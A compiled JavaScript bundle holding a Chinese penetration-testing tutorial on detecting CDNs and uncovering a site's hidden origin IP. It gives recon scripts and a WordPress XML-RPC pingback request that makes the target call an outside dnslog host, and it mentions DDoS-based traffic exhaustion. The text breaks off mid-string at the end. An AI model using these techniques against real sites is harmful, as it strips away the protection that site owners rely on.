"use strict";(self.webpackChunkone_piece=self.webpackChunkone_piece||[]).push([[757],{7708:(n,s)=>{s.A=(n,s)=>{const a=n.__vccOpts||n;for(const[n,e]of s)a[n]=e;return a}},8921:(n,s,a)=>{a.r(s),a.d(s,{comp:()=>En,data:()=>Mn});var e=a(4754);const t=a.p+"assets/img/image-20240409110148-qkny955.98c9dae5.png",l=a.p+"assets/img/image-20240409100045-oeq1tcs.bb9c4fbd.png",i=a.p+"assets/img/image-20240409101451-k5aece9.4eebfb58.png",o=a.p+"assets/img/image-20240409105827-tq42jkn.e2faf206.png",p=a.p+"assets/img/image-20240409133942-yjgr91m.300a981a.png",r=a.p+"assets/img/image-20240409135846-s4rghsx.8b4cb150.png",c=a.p+"assets/img/image-20240409135906-jaz7ybr.4900b26a.png",d=a.p+"assets/img/image-20240409110944-158abbb.69d63de8.png",u=(0,e.Lk)("p",null,[(0,e.eW)("​"),(0,e.Lk)("img",{src:t,alt:"image",loading:"lazy"}),(0,e.eW)("​")],-1),k=(0,e.Lk)("h2",{id:"什么是-cdn",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#什么是-cdn"},[(0,e.Lk)("span",null,"什么是 CDN")])],-1),h={href:"https://en.wikipedia.org/wiki/Content_delivery_network",target:"_blank",rel:"noopener noreferrer"},m=(0,e.Lk)("p",null,"CDN 通过将内容缓存到分布在全球各地的边缘节点上，使用户能够从离他们更近的服务器获取内容（包括 HTML 网页、JavaScript 文件、样式表、图像和视频），从而减少了内容传输的延迟和带宽消耗。",-1),v=(0,e.Lk)("p",null,"关于 CDN 的详细资料可以在以下链接进行详细的的学习。",-1),b={href:"https://www.cloudflare-cn.com/learning/cdn/what-is-a-cdn/",target:"_blank",rel:"noopener noreferrer"},g={href:"https://aws.amazon.com/cn/what-is/cdn/",target:"_blank",rel:"noopener noreferrer"},f={href:"https://zhuanlan.zhihu.com/p/28940451",target:"_blank",rel:"noopener noreferrer"},L=(0,e.Fv)('<p>​<img src="'+l+'" alt="image" loading="lazy">​</p><h2 id="判断-cdn" tabindex="-1"><a class="header-anchor" href="#判断-cdn"><span>判断 CDN</span></a></h2><h3 id="多地-ping" tabindex="-1"><a class="header-anchor" href="#多地-ping"><span>多地 Ping</span></a></h3><p>CDN 的工作原理是将网站的内容复制到位于全球各地的边缘节点上的服务器上。当用户请求访问网站时，<strong>CDN 会自动根据用户的位置选择最近的服务器节点来响应请求。</strong></p><p>因此，若通过多地 ping 测试得到多个不同的 IP 地址，则意味着网站的内容在不同的地理位置都有相应的服务器节点。</p><p>通过下图可以看到，ping 后得到多个不同的 IP 地址，这说明 GitHub 应用了 CDN。</p><p>​<img src="'+i+'" alt="image" loading="lazy">​</p><p><strong>【超级 ping】</strong></p>',8),N={href:"https://www.itdog.cn/ping/",target:"_blank",rel:"noopener noreferrer"},w={href:"https://tool.chinaz.com/speedworld/",target:"_blank",rel:"noopener noreferrer"},C={href:"https://www.host-tracker.com/v3/check/",target:"_blank",rel:"noopener noreferrer"},y=(0,e.Fv)('<h3 id="nslookup" tabindex="-1"><a class="header-anchor" href="#nslookup"><span>nslookup</span></a></h3><p>nslookup (全称 name server lookup) ，是一个在命令行界面下的网络工具，在 windows 中无需下载即可使用，它有两种模式：交互和非交互。</p><p>一般来说，非交互模式适用于简单的单次查询，若需要多次查询，则交互模式更加适合。nslookup 判断网站是否应用 CDN 的原理同上。</p><p><strong>【查看帮助】</strong> Windows 下有两种，一种是直接输入 <code>nslookup /?</code>​，还有一种是在交互模式下输入 help 或者 <code>?</code>​，交互模式下的帮助会更加详细。</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token operator">&gt;</span> <span class="token function">nslookup</span>\nDNS request timed out.\n    <span class="token function">timeout</span> was <span class="token number">2</span> seconds.\n默认服务器:  UnKnown\nAddress:  <span class="token number">192.168</span>.1x.x\n\n<span class="token operator">&gt;</span> <span class="token builtin class-name">help</span>\n命令:   <span class="token punctuation">(</span>标识符以大写表示，<span class="token punctuation">[</span><span class="token punctuation">]</span> 表示可选<span class="token punctuation">)</span>\nNAME            - 打印有关使用默认服务器的主机/域 NAME 的信息\nNAME1 NAME2     - 同上，但将 NAME2 用作服务器\n<span class="token builtin class-name">help</span> or ?       - 打印有关常用命令的信息\n<span class="token builtin class-name">set</span> OPTION      - 设置选项\n    all                 - 打印选项、当前服务器和主机\n    <span class="token punctuation">[</span>no<span class="token punctuation">]</span>debug           - 打印调试信息\n    <span class="token punctuation">[</span>no<span class="token punctuation">]</span>d2              - 打印详细的调试信息\n    <span class="token punctuation">[</span>no<span class="token punctuation">]</span>defname         - 将域名附加到每个查询\n    <span class="token punctuation">[</span>no<span class="token punctuation">]</span>recurse         - 询问查询的递归应答\n    <span class="token punctuation">[</span>no<span class="token punctuation">]</span>search          - 使用域搜索列表\n    <span class="token punctuation">[</span>no<span class="token punctuation">]</span>vc              - 始终使用虚拟电路\n    <span class="token assign-left variable">domain</span><span class="token operator">=</span>NAME         - 将默认域名设置为 NAME\n    <span class="token assign-left variable">srchlist</span><span class="token operator">=</span>N1<span class="token punctuation">[</span>/N2/<span class="token punctuation">..</span>./N6<span class="token punctuation">]</span> - 将域设置为 N1，并将搜索列表设置为 N1、N2 等\n    <span class="token assign-left variable">root</span><span class="token operator">=</span>NAME           - 将根服务器设置为 NAME\n    <span class="token assign-left variable">retry</span><span class="token operator">=</span>X             - 将重试次数设置为 X\n    <span class="token assign-left variable">timeout</span><span class="token operator">=</span>X           - 将初始超时间隔设置为 X 秒\n    <span class="token assign-left variable">type</span><span class="token operator">=</span>X              - 设置查询类型<span class="token punctuation">(</span>如 A、AAAA、A+AAAA、ANY、CNAME、MX、\n                          NS、PTR、SOA 和 SRV<span class="token punctuation">)</span>\n    <span class="token assign-left variable">querytype</span><span class="token operator">=</span>X         - 与类型相同\n    <span class="token assign-left variable">class</span><span class="token operator">=</span>X             - 设置查询类<span class="token punctuation">(</span>如 IN <span class="token punctuation">(</span>Internet<span class="token punctuation">)</span>和 ANY<span class="token punctuation">)</span>\n    <span class="token punctuation">[</span>no<span class="token punctuation">]</span>msxfr           - 使用 MS 快速区域传送\n    <span class="token assign-left variable">ixfrver</span><span class="token operator">=</span>X           - 用于 IXFR 传送请求的当前版本\nserver NAME     - 将默认服务器设置为 NAME，使用当前默认服务器\nlserver NAME    - 将默认服务器设置为 NAME，使用初始服务器\nroot            - 将当前默认服务器设置为根服务器\n<span class="token function">ls</span> <span class="token punctuation">[</span>opt<span class="token punctuation">]</span> DOMAIN <span class="token punctuation">[</span><span class="token operator">&gt;</span> FILE<span class="token punctuation">]</span> - 列出 DOMAIN 中的地址<span class="token punctuation">(</span>可选: 输出到文件 FILE<span class="token punctuation">)</span>\n    <span class="token parameter variable">-a</span>          -  列出规范名称和别名\n    <span class="token parameter variable">-d</span>          -  列出所有记录\n    <span class="token parameter variable">-t</span> TYPE     -  列出给定 RFC 记录类型<span class="token punctuation">(</span>例如 A、CNAME、MX、NS 和 PTR 等<span class="token punctuation">)</span>\n                   的记录\nview FILE           - 对 <span class="token string">&#39;ls&#39;</span> 输出文件排序，并使用 pg 查看\n<span class="token builtin class-name">exit</span>            - 退出程序\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>【使用】</strong></p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token function">nslookup</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span> <span class="token punctuation">[</span>name <span class="token operator">|</span> -<span class="token punctuation">]</span> <span class="token punctuation">[</span>server<span class="token punctuation">]</span>\n\n--------\n<span class="token function">nslookup</span> target.com <span class="token operator">&lt;</span>海外 DNS 地址<span class="token operator">&gt;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>name 表示要查询的域名或 IP 地址。如果将 name 设置为空，则 nslookup 会进入交互模式，允许逐步输入要查询的信息。</p></li><li><p>server 表示要查询的 DNS 服务器地址，默认情况下会使用本地 DNS 服务器</p></li><li><p>常用 option 包括：</p><p>​<code>-port</code>​​：指定要使用的 DNS 服务器端口号，默认为 53。</p><p>​<code>-query</code>​​：指定要查询的 DNS 记录类型，默认为 A 记录，即 IPV4。AAA 表示查询 IPV6</p></li></ul><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token operator">&gt;</span> <span class="token function">nslookup</span> <span class="token parameter variable">-query</span><span class="token operator">=</span>A www.baidu.com\n服务器:  UnKnown\nAddress:  <span class="token number">192.168</span>.x.x\n\n非权威应答:\n名称:    www.a.shifen.com\nAddresses:  <span class="token number">120.232</span>.145.144\n          <span class="token number">120.232</span>.145.185\nAliases:  www.baidu.com\n\n--------\n<span class="token operator">&gt;</span> <span class="token function">nslookup</span> baidu.com\n服务器:  UnKnown\nAddress:  <span class="token number">192.168</span>.x.x\n\n非权威应答:\n名称:    baidu.com\nAddresses:  <span class="token number">110.242</span>.68.66\n          <span class="token number">39.156</span>.66.10\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>服务器: UnKnown，表示本次查询使用的 DNS 服务器名称是未知的。</li><li>Address: 192.168.x.x，表示本次查询使用的 DNS 服务器的 IP 地址。</li><li>非权威应答：这意味着本次查询结果不是来自权威 DNS 服务器，而是来自缓存或其他非权威 DNS 服务器的响应。</li><li>Addresses: 39.156.66.10 和 110.242.68.66：这是查询到的 baidu.com 的 IP 地址，可以看到 baidu.com 有两个 IP 地址。</li><li>名称: www.a.shifen.com，这是查询得到的实际主机名，www.baidu.com 是百度网站的别名。</li></ul><h3 id="其他" tabindex="-1"><a class="header-anchor" href="#其他"><span>其他</span></a></h3><ul><li>反查域名 IP，看结果是否有大量不相关的域名存在</li><li>观察请求响应的返回数据的头部，是否有 CDN 服务商标识</li><li>判断 IP 是否在常见 CDN 服务商的服务器 IP 段上</li><li>若 asp 或者 asp.net 网站返回头的 server 不是 IIS、而是 Nginx，则多半使用了 nginx 反向代理到 CDN</li></ul><h2 id="绕过-cdn" tabindex="-1"><a class="header-anchor" href="#绕过-cdn"><span>绕过 CDN</span></a></h2><p>有些时候我们需要对网站真实 IP 地址进行探测或者绕过 CDN 限制访问网站，这时就需要使用一些绕过 CDN 的技术。</p><h3 id="子域名辅助查询" tabindex="-1"><a class="header-anchor" href="#子域名辅助查询"><span>子域名辅助查询</span></a></h3><p>在 CDN 技术中，CDN 节点会代替真实服务器处理用户的请求，并将响应返回给用户。因此，如果我们能够找到一个不经过 CDN 节点直接请求到真实服务器的方法，就可以绕过 CDN。<strong>其中一种方法就是使用子域名辅助查询。</strong></p><p>CDN 通常会将网站的主域名和子域名分别分配到不同的节点上，或者子域名没有使用 CDN。<strong>通过查询某些子域名的 DNS 解析记录，我们可能可以找到真实服务器的 IP 地址。</strong> 不过有时候查出来的并不是真实 IP，可能仅仅做了 A 记录 ，这种情况下可以继续扫描同 C 段的 IP 和端口，然后逐个探测是否为目标网站。</p><h3 id="历史-dns-解析记录" tabindex="-1"><a class="header-anchor" href="#历史-dns-解析记录"><span>历史 DNS 解析记录</span></a></h3>',18),D=(0,e.Lk)("strong",null,"历史 DNS 解析记录",-1),S={href:"https://search.censys.io/",target:"_blank",rel:"noopener noreferrer"},W={href:"https://www.shodan.io/",target:"_blank",rel:"noopener noreferrer"},x={href:"https://x.threatbook.com/",target:"_blank",rel:"noopener noreferrer"},F=(0,e.Fv)('<p>​<img src="'+o+'" alt="image" loading="lazy">​</p><p>DNS 解析记录中重点关注 TXT 记录和 SPF 记录，是否有泄露真实 IP。</p><p>历史域名：网站在更换新域名时，如果将 CDN 部署到新的域名上，而之前的域名由于没过期，可能未使用 CDN，因此可以直接获得服务器 IP。</p><h3 id="大数据检索" tabindex="-1"><a class="header-anchor" href="#大数据检索"><span>大数据检索</span></a></h3><p>借助测绘检索工具（如 FOFA 等）可查找源 IP。<strong>通常 CDN 服务商会有固定的 IP 地址段</strong>，我们可以根据搜索结果中的 IP 地址信息，识别和排除可能属于 CDN 服务商的 IP 地址。再进一步验证和对比其它数据源的信息，就可能得到源 IP。</p><h3 id="国外主机解析" tabindex="-1"><a class="header-anchor" href="#国外主机解析"><span>国外主机解析</span></a></h3><p>最后一种绕过 CDN 的方法是使用国外主机解析。由于 CDN 技术通常是基于地理位置的，因此不同国家或者地区的用户可能会被分配到不同的 CDN 节点上。如果我们能够使用国外的主机来对网站进行访问，就有可能绕过 CDN 限制。（代理访问）</p><h3 id="通过-ssl-证书" tabindex="-1"><a class="header-anchor" href="#通过-ssl-证书"><span>通过 SSL 证书</span></a></h3><ul><li>证书颁发机构 (CA) 必须将他们发布的每个 SSL/TLS 证书发布到公共日志中，SSL/TLS 证书通常包含域名、子域名和电子邮件地址。因此可以利用 SSL/TLS 证书来发现目标站点的真实 IP 地址。</li><li>CDN 运营商在给服务器提供保护的同时，也会与其服务器进行加密通信（ssl），这时当服务器的 443 端口接入域名时也会在 443 端口暴露其证书，我们通过证书比对便可发现网站的真实 IP 地址。</li><li>思维误区，认为 <code>有效</code>​ 的证书才是我们需要的，但其实并不一定，很多服务器配置错误依然保留的是 <code>无效</code>​ 的证书。还可以通过指纹定位到 IP。</li></ul><p>​<img src="'+p+'" alt="image" loading="lazy">​</p><p><strong>【使用命令行】</strong></p><ul><li>通过 <code>openssl</code>​ 和 <code>curl</code>​ 等常见的基础命令，也同样可以达到反查 SSL 证书的效果。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>openssl s_client <span class="token parameter variable">-connect</span> <span class="token number">123.123</span>.123.123:443 <span class="token operator">|</span> <span class="token function">grep</span> subject\n\n<span class="token function">curl</span> <span class="token parameter variable">-v</span> https://123.123.123.123 <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">&#39;subject&#39;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>【使用工具和脚本】</strong></p><p>通过自己写工具脚本，集成前面的 1、2 两点，完全可以做到一个简易版的 SSL 全网证书爬取，也可以利用现有的一些脚本工具和网站，省的我们自己费力了。</p>',15),P=(0,e.Lk)("code",null,"CloudFlair",-1),A={href:"https://github.com/christophetd/CloudFlair",target:"_blank",rel:"noopener noreferrer"},I=(0,e.Lk)("p",null,"脚本兼容 python2.7 和 3.5，需要配置 Censys API，不过只针对目标网站是否使用 CloudFlare 服务进行探测。",-1),_=(0,e.Lk)("p",null,[(0,e.Lk)("strong",null,"【证书收集】")],-1),E={href:"https://crt.sh/",target:"_blank",rel:"noopener noreferrer"},M=(0,e.Fv)('<div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">import</span> requests\n<span class="token keyword">import</span> re\n\nTIME_OUT <span class="token operator">=</span> <span class="token number">60</span>\n<span class="token keyword">def</span> <span class="token function">get_SSL</span><span class="token punctuation">(</span>domain<span class="token punctuation">)</span><span class="token punctuation">:</span>\n    domains <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>\n    url <span class="token operator">=</span> <span class="token string">&#39;https://crt.sh/?q=%25.{}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>domain<span class="token punctuation">)</span>\n    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span>TIME_OUT<span class="token punctuation">)</span>\n    ssl <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">&quot;&lt;TD&gt;(.*?).{}&lt;/TD&gt;&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>domain<span class="token punctuation">)</span><span class="token punctuation">,</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>\n    <span class="token keyword">for</span> i <span class="token keyword">in</span> ssl<span class="token punctuation">:</span>\n        i <span class="token operator">+=</span> <span class="token string">&#39;.&#39;</span> <span class="token operator">+</span> domain\n        domains<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>\n    <span class="token keyword">print</span><span class="token punctuation">(</span>domains<span class="token punctuation">)</span>\n\n<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>\n    get_SSL<span class="token punctuation">(</span><span class="token string">&quot;baidu.com&quot;</span><span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="通过-f5-ltm-解码" tabindex="-1"><a class="header-anchor" href="#通过-f5-ltm-解码"><span>通过 F5 LTM 解码</span></a></h3><p>当服务器使用 F5 LTM 做负载均衡时，通过对 <code>set-cookie</code>​ 关键字的解码，可以获取服务器真实 ip 地址。例如：</p><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">BIGipServerpool_9.29_5229=605532106.22012.0000</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>先把第一小节的十进制数，即 605532106 取出来</li><li>将其转为十六进制数 2417afca</li><li>接着从后至前，取四个字节出来： CA AF 17 24</li><li>最后依次转为十进制数 202.175.23.36，即是服务器的真实 ip 地址。</li></ul><h3 id="通过-xml-rpc-pingback-通信" tabindex="-1"><a class="header-anchor" href="#通过-xml-rpc-pingback-通信"><span>通过 XML-RPC PINGBACK 通信</span></a></h3><ul><li>XML-RPC 是支持 WordPress 与其他系统之间通信的规范，它通过使用 HTTP 作为传输机制和 XML 作为编码机制来标准化这些通信过程。</li><li>在 WordPress 的早期版本中，默认情况下已关闭 XML-RPC，但是从 3.5 版本开始，默认情况下开启。</li><li>XML-RPC 支持 trackback 和 pingback。</li><li>虽然 WordPress 启用了 REST API 来代替 XML-RPC ，不过 XML-RPX 不会过时的，放心大胆的使用就好，虽然 XML-RPC 这个技术很老了，但依然可以通杀很多网站。</li></ul><p>配置好 dnslog，POST 请求 XML-RPC。</p><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/xmlrpc.php</span> <span class="token http-version property">HTTP/1.1</span></span>\n<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">domain.com</span></span>\n<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>\n<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>\n<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36</span></span>\n<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span></span>\n<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>\n<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en,zh-CN;q=0.9,zh;q=0.8</span></span>\n<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>\n<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>\n<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">323</span></span>\n\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;methodCall&gt;\n&lt;methodName&gt;pingback.ping&lt;/methodName&gt;\n&lt;params&gt;\n&lt;param&gt;\n&lt;value&gt;&lt;string&gt;http://2vbis4.dnslog.cn&lt;/string&gt;&lt;/value&gt;\n&lt;/param&gt;\n&lt;param&gt;\n&lt;value&gt;&lt;string&gt;https://domain.com/&lt;/string&gt;&lt;/value&gt;\n&lt;/param&gt;\n&lt;/params&gt;\n&lt;/methodCall&gt;\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>响应，刷新一下 dnslog ，获得了真实服务器 IP。</p><p>​<img src="'+r+'" alt="image" loading="lazy">​</p><p>​<img src="'+c+'" alt="image" loading="lazy">​</p><h3 id="通过-favicon-ico-哈希特征" tabindex="-1"><a class="header-anchor" href="#通过-favicon-ico-哈希特征"><span>通过 favicon.ico 哈希特征</span></a></h3>',13),T=(0,e.Lk)("li",null,"favicon.ico 是现代浏览器在网页标题的左侧显示的一个小图标。",-1),q={href:"https://anywebsite/favicon.ico",target:"_blank",rel:"noopener noreferrer"},z=(0,e.Lk)("li",null,"因为可以通过计算 favicon.ico 的指纹哈希，然后去 shodan 等搜索引擎搜索与之相同的主机结果，从而进一步探测是否能挖掘出目标网站的真实 IP 地址。",-1),B=(0,e.Fv)('<p>计算 favicon.ico 哈希的小脚本：</p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token comment"># -------- python2 版本</span>\n<span class="token keyword">import</span> mmh3\n<span class="token keyword">import</span> requests\n\nresponse <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;https://domain.com/favicon.ico&#39;</span><span class="token punctuation">)</span>\nfavicon <span class="token operator">=</span> response<span class="token punctuation">.</span>content<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;base64&#39;</span><span class="token punctuation">)</span>\n<span class="token builtin">hash</span> <span class="token operator">=</span> mmh3<span class="token punctuation">.</span><span class="token builtin">hash</span><span class="token punctuation">(</span>favicon<span class="token punctuation">)</span>\n<span class="token keyword">print</span> <span class="token builtin">hash</span>\n\n<span class="token comment"># -------- python3 版本</span>\n<span class="token keyword">import</span> mmh3\n<span class="token keyword">import</span> requests\n<span class="token keyword">import</span> codecs\n\nresponse <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;https://domain.com/favicon.ico&#39;</span><span class="token punctuation">)</span>\nfavicon <span class="token operator">=</span> codecs<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>response<span class="token punctuation">.</span>content<span class="token punctuation">,</span><span class="token string">&quot;base64&quot;</span><span class="token punctuation">)</span>\n<span class="token builtin">hash</span> <span class="token operator">=</span> mmh3<span class="token punctuation">.</span><span class="token builtin">hash</span><span class="token punctuation">(</span>favicon<span class="token punctuation">)</span>\n<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hash</span><span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>安装好环境依赖后执行脚本，计算得到目标网站的 favicon.ico 哈希值：</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>$ <span class="token function">apt-get</span> <span class="token function">install</span> build-essential\n$ <span class="token function">apt-get</span> <span class="token function">install</span> gcc\n$ <span class="token function">apt-get</span> <span class="token function">install</span> g++\n$ python <span class="token number">3</span>.py\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后用 shodan 搜索引擎搜索哈希，去命中 IP：</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>$ proxychains shodan search http.favicon.hash:1730752770 <span class="token parameter variable">--fields</span> ip_str,port <span class="token parameter variable">--separator</span> <span class="token string">&quot; &quot;</span> <span class="token operator">|</span> <span class="token function">awk</span> &#39;<span class="token punctuation">{</span>print <span class="token variable">$1</span>&quot;:\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>渗透过程中同样可以根据 favicon 哈希、子域、IP 的命中，做好指纹排序并整理，另外做一张常见的中间件或者组件指纹哈希表，分类进行资产快速命中。</p><p><strong>【PS】</strong> ：在服务器源 IP 地址允许访问并且返回的也是类似的网站内容情况下，可以通过侦察页面源码中 JS 、CSS 、HTML 等一系列静态特征值，然后用 Shodan 、Zoomeye 、Censys 等搜索引擎进行匹配搜索，从而定位 IP 。</p><h3 id="通过流量耗尽、流量放大攻击-不建议使用" tabindex="-1"><a class="header-anchor" href="#通过流量耗尽、流量放大攻击-不建议使用"><span>通过流量耗尽、流量放大攻击（不建议使用）</span></a></h3><ul><li>CDN 是收费的，那么其流量一定是有限的，对一些不是超大型目标网站在进行测试时，注意，一定要在项目方授权允许的情况下，可以尝试进行 ddos 流量测试。</li><li>CDN 流量耗尽了，就不存在内容分发了，直接就可以拿到源 IP 。</li><li>但是，CDN 是流量穿透的，别流量耗尽前，目标网站先 gg 了。</li><li>另一种比较古老的做法是通过 CDN 设置中的自身缺陷，将要保护的源站 IP 设置成为 CDN 节点的地址，致使 CDN 流量进入死循环，一层层放大后，最终自己打死自己。不过大多数的 CDN 厂商早已限制禁止将 CDN 节点设置成 CDN 节点 IP ，并且启用了自动丢包保护机制。</li></ul><h3 id="在线平台" tabindex="-1"><a class="header-anchor" href="#在线平台"><span>在线平台</span></a></h3><h4 id="securitytrails" tabindex="-1"><a class="header-anchor" href="#securitytrails"><span>SecurityTrails</span></a></h4>',12),X={href:"https://securitytrails.com/%EF%BC%89",target:"_blank",rel:"noopener noreferrer"},R=(0,e.Lk)("p",null,"SecurityTrails 是我最常用的平台之一，免费、精准，数据量极其庞大，足够支撑日常。",-1),O=(0,e.Lk)("p",null,[(0,e.eW)("​"),(0,e.Lk)("img",{src:d,alt:"image",loading:"lazy"}),(0,e.eW)("​")],-1),j=(0,e.Lk)("h4",{id:"complete-dns",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#complete-dns"},[(0,e.Lk)("span",null,"Complete DNS")])],-1),H={href:"https://completedns.com/%EF%BC%89",target:"_blank",rel:"noopener noreferrer"},U=(0,e.Lk)("h4",{id:"whoisrequest",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#whoisrequest"},[(0,e.Lk)("span",null,"WhoISrequest")])],-1),G={href:"https://whoisrequest.com/%EF%BC%89",target:"_blank",rel:"noopener noreferrer"},K=(0,e.Lk)("h4",{id:"whoxy",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#whoxy"},[(0,e.Lk)("span",null,"Whoxy")])],-1),J={href:"https://www.whoxy.com/%EF%BC%89",target:"_blank",rel:"noopener noreferrer"},V=(0,e.Lk)("h4",{id:"netcraft",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#netcraft"},[(0,e.Lk)("span",null,"Netcraft")])],-1),$={href:"https://netcraft.com/%EF%BC%89",target:"_blank",rel:"noopener noreferrer"},Y=(0,e.Lk)("h4",{id:"viewdns",tabindex:"-1"},[(0,e.Lk)("a",{class:"header-anchor",href:"#viewdns"},[(0,e.Lk)("span",null,"Viewdns")])],-1),Z={href:"https://viewdns.info/%EF%BC%89",target:"_blank",rel:"noopener 